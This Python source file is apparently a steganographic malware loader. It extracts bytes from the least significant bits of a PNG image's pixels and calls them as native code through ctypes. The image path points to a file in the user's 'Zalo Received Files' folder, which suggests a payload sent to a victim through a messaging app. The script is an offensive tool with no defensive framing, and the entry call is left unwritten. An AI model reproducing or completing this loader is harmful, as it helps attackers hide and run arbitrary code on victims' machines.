import os
from PIL import Image
import numpy as np
import subprocess
import ctypes

def execute_bytearray(byte_array):
    """
    Execute a bytearray containing native executable code.
    """
    try:
        # Allocate executable memory
        memory = ctypes.create_string_buffer(byte_array)
        func = ctypes.cast(memory, ctypes.CFUNCTYPE(None))

        print("Executing the byte array as native code.")
        func()  # Call the function stored in memory

    except Exception as e:
        print(f"An error occurred while executing byte array: {e}")

def decode_and_execute_lsb(encoded_image_path):
    try:
        # Open the encoded image
        encoded_img = Image.open(encoded_image_path).convert("RGB")
        encoded_pixels = np.array(encoded_img)

        # Flatten the image array for easier bit extraction
        flat_pixels = encoded_pixels.flatten()

        # Extract the binary data from the LSBs of the pixels
        binary_bits = []
        for pixel_value in flat_pixels:
            binary_bits.append(pixel_value & 1)  # Extract the LSB

        # Group bits into bytes (8 bits per byte)
        byte_data = []
        for i in range(0, len(binary_bits), 8):
            byte = binary_bits[i:i + 8]
            byte_data.append(int(''.join(map(str, byte)), 2))

        # Convert to a bytearray
        byte_array = bytearray(byte_data)

        execute_bytearray(byte_array)
    except FileNotFoundError:
        print("Image file not found. Please check the path.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred during execution: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

image = os.path.join(os.getenv("USERPROFILE"), "Documents", "Zalo Received Files", "encoded_lsb.png")

